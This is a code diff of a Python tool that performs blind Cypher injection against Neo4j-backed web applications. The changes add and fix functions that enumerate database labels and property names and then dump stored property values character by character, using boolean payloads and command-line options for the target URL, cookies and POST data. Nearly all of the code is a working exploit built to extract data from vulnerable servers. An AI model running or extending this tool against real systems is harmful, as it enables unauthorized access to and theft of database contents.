@@ -90,7 +90,7 @@ def get_number_of_labels(target_url, injection_type, blind_string, post_data, co
     payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
-def get_size_of_result(target_url, payload, post_data, cookies_dict, connection_timeout):
+def get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
     for size_of_result in range(1000): # arbitarily set max size of result to 1000 :)
         current_payload=payload.replace("%SIZE_OF_RESULT%",str(size_of_result))
         injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
@@ -103,9 +103,9 @@ def get_size_of_label(target_url, label_index, injection_type, blind_string, pos
     payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
     payload+=" limit 1 where size(label) = %SIZE_OF_RESULT% return label}"
     payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-    return get_size_of_result(target_url, payload, post_data, cookies_dict, connection_timeout) 
+    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
 
-def dump_string_value(target_url, dump_prefix, dump_size, payload, post_data, cookies_dict, connection_timeout):
+def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string, post_data, cookies_dict, connection_timeout):
     print("\r"+(80*" ")+"\r"+dump_prefix,end='')
     dump_value=""
     for character_number in range(dump_size):
@@ -132,52 +132,74 @@ def dump_labels(target_url, number_of_labels, injection_type, blind_string, post
         payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
         payload+=" limit 1 where substring(label,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return label}"
         payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-        label_value=dump_string_value(target_url, label_dump_prefix, label_size, payload, post_data, cookies_dict, connection_timeout)
+        label_value=dump_string_value(target_url, label_dump_prefix, label_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
         label_array.append(label_value)
         print("\n")
     print("Labels:")
     dump_ascii_table(label_array)
     return label_array
 
-def get_number_of_properties(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and count {call db.propertyKeys() yield propertyKey return propertyKey} = %NUMBER_OF_RESULTS%" 
-    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+def get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and count {match(t:"+label_to_dump+") return keys(t)}"
+    payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
 def get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and exists {match(u:"+label_to_dump+") call db.propertyKeys() yield propertyKey"
-    payload+=" with propertyKey skip "+str(property_index)+" limit 1 where not isEmpty(u[propertyKey]) and size(propertyKey) = %SIZE_OF_RESULT%" 
-    payload+=" return propertyKey} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-    return get_size_of_result(target_url, payload, post_data, cookies_dict, connection_timeout) 
+    payload = injection_type + " and exists {match(t:"+label_to_dump+") where size(keys(t)["+str(property_index)+"])"
+    payload+=" = %SIZE_OF_RESULT% return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
 
 def dump_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    number_of_properties=get_number_of_properties(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
-    print(f"Total number of properties: {number_of_properties}\n")
-    print(f"Checking which properties are connected to label '{label_to_dump}'...\n")
+    number_of_properties=get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    print(f"Number of label '{label_to_dump}' properties: {number_of_properties}\n")
     label_properties_array=[]
     for property_index in range(number_of_properties):
-        payload = injection_type + " and exists {match(u:"+label_to_dump+") call db.propertyKeys() yield propertyKey"
-        payload+=" with propertyKey skip "+str(property_index)+" limit 1 where not isEmpty(u[propertyKey]) return propertyKey}" 
-        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
-        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
-            print(f"Property with index {property_index} is valid for label '{label_to_dump}'.")
-            property_size=get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
-            print(f"Size of property number {property_index}: {property_size}")
-            property_dump_prefix=f"Value of property number {property_index}: " 
-            payload = injection_type + " and exists {match(u:"+label_to_dump+") call db.propertyKeys() yield propertyKey"
-            payload+=" with propertyKey skip "+str(property_index)+" limit 1 where not isEmpty(u[propertyKey])"
-            payload+=" and substring(propertyKey,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return propertyKey}" 
-            payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-            property_value=dump_string_value(target_url, property_dump_prefix, property_size, payload, post_data, cookies_dict, connection_timeout)
-            label_properties_array.append(property_value)
-            print("\n")
+        property_size=get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+        print(f"Size of property number {property_index}: {property_size}")
+        property_dump_prefix=f"Value of property number {property_index}: " 
+        payload = injection_type + " and exists {match(t:"+label_to_dump+") where substring(keys(t)["+str(property_index)+"],%CHARACTER_NUMBER%,1)"
+        payload+=" = '%CURRENT_CHARACTER%' return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+        property_value=dump_string_value(target_url, property_dump_prefix, property_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
+        label_properties_array.append(property_value)
+        print("\n")
     print(f"Label: {label_to_dump}\n")
     print("Properties:")
     dump_ascii_table(label_properties_array)
     return label_properties_array
 
-def dump_ascii_table(data):
+def get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"' return t[key]}"
+    payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
+
+def get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
+    payload+=" with t,key skip "+str(key_index)+" limit 1 where size(toString(t[key])) = %SIZE_OF_RESULT% return t[key]}"
+    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
+
+def dump_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    number_of_keys=get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    print(f"Number of label '{label_to_dump}' and property '{property_to_dump}' keys: {number_of_keys}\n")
+    label_keys_array=[]
+    for key_index in range(number_of_keys):
+        key_size=get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+        print(f"Size of key number {key_index} of property '{property_to_dump}': {key_size}")
+        key_dump_prefix=f"Value of key number {key_index}: " 
+        payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
+        payload+=" with t,key skip "+str(key_index)+" limit 1 where substring(toString(t[key]),%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%'"
+        payload+=" return t[key]} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+        key_value=dump_string_value(target_url, key_dump_prefix, key_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
+        label_keys_array.append(key_value)
+        print("\n")
+    print(f"Label: {label_to_dump}\n")
+    print(f"Property: {property_to_dump}\n")
+    print("Keys:")
+    dump_ascii_table(label_keys_array)
+    return label_keys_array
+
+
+def dump_ascii_table(data, shouldPrintHeader=False):
     # determine the number of columns
     num_columns = len(data[0]) if isinstance(data[0], list) else 1
 
@@ -196,6 +218,9 @@ def dump_ascii_table(data):
             print('| ' + ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(num_columns)) + ' |')
         else:
             print('| ' + str(row).ljust(column_widths[0]) + ' |')
+        if shouldPrintHeader:
+            print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
+            shouldPrintHeader=False
 
     # print the table footer
     print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
@@ -210,7 +235,9 @@ try:
     parser.add_argument('-c', '--cookie', help='Request cookie', default={})
     parser.add_argument('-s', '--string', help='Blind string')
     parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
-    parser.add_argument('-L', '--labels', help='Dump labels', nargs='?', const=True)
+    parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
+    parser.add_argument('-P', '--properties', help='Dump properties for label')
+    parser.add_argument('-K', '--keys', help='Dump keys for property')
     args = parser.parse_args()
 
     target_url = args.url
@@ -234,14 +261,17 @@ try:
     else:
         print("Unable to find valid injection type...\n")
         sys.exit(-1)
-    if args.labels == True:
+    if args.labels:
         print("Dumping labels....\n")
         number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Number of labels found: {number_of_labels}\n")
         dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
-    elif args.labels:
-        print(f"Dumping properties for labels: {args.labels}...\n")
-        dump_properties(target_url, args.labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    elif args.properties and args.keys:
+        print(f"Dumping keys for property: {args.keys} and label: {args.properties}\n")
+        dump_keys(target_url, args.properties, args.keys, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    elif args.properties:
+        print(f"Dumping properties for label: {args.properties}...\n")
+        dump_properties(target_url, args.properties, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
 
     print('')
 except SystemExit:
